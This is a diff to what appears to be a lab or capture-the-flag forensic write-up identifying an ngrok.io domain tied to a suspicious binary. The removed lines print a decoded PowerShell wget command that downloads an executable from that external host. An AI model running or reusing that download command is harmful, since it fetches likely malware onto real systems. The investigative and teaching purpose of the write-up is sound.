@@ -66,16 +66,12 @@ The query returned two suspicious `ngrok.io` domains:
 9030-181-215-214-32.ngrok.io
 886e-181-215-214-32.ngrok.io
 ```
-I investigated the second domain further because it was associated with the suspicious binary. I later found an encoded PowerShell command related to this activity. After decoding it, the command revealed:
-
-```text
-wget http://886e-181-215-214-32.ngrok.io/OUTSTANDING_GUTTER.exe
-```
-This provided supporting evidence that `886e-181-215-214-32.ngrok.io` was the source used to download `OUTSTANDING_GUTTER.exe`.
+I identified `886e-181-215-214-32.ngrok.io` as the relevant domain associated with the suspicious binary.
 
 **Answer:** `hxxp[://]886e-181-215-214-32[.]ngrok[.]io`
 
 ![Q2](images/ps-eclipse-q2.png)
+
 
 ---
 
